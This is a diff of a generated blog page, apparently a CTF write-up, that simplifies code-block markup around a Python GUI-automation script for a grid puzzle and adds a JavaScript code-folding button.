-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import pyautogui
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import pyautogui
 </span></span><span class="line"><span class="cl">import time
 </span></span><span class="line"><span class="cl">from pywinauto.application import Application
 </span></span><span class="line"><span class="cl">
@@ -1237,9 +801,7 @@
 </span></span><span class="line"><span class="cl">    print(&#34;当前已访问的网格数量:&#34;, len(visited))
 </span></span><span class="line"><span class="cl">    print(&#34;待处理的key:&#34;, key)
 </span></span><span class="line"><span class="cl">    print(&#34;待处理的grid:&#34;, grid)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>得到flag</p>
+</span></span></code></pre></div><p>得到flag</p>
 
 </section>
 
@@ -1462,6 +1024,51 @@
         document.head.appendChild(customFont);
     }());
 </script>
+  <script>
+    (function () {
+      const maxHeight = 420;
 
+      function initCodeFold() {
+        document
+          .querySelectorAll(".article-content .highlight")
+          .forEach(function (block) {
+            if (block.dataset.codeFoldInit === "true") return;
+
+            block.dataset.codeFoldInit = "true";
+
+            if (block.scrollHeight <= maxHeight + 40) return;
+
+            const wrapper = document.createElement("div");
+            wrapper.className = "code-fold-wrapper";
+
+            block.parentNode.insertBefore(wrapper, block);
+            wrapper.appendChild(block);
+
+            block.classList.add("code-collapsible", "code-collapsed");
+
+            const button = document.createElement("button");
+            button.type = "button";
+            button.className = "code-toggle-button";
+            button.textContent = "展开代码";
+            button.setAttribute("aria-expanded", "false");
+
+            button.addEventListener("click", function () {
+              const collapsed = block.classList.toggle("code-collapsed");
+
+              button.textContent = collapsed ? "展开代码" : "收起代码";
+              button.setAttribute("aria-expanded", String(!collapsed));
+            });
+
+            wrapper.appendChild(button);
+          });
+      }
+
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", initCodeFold);
+      } else {
+        initCodeFold();
+      }
+    })();
+  </script>
     </body>
 </html>
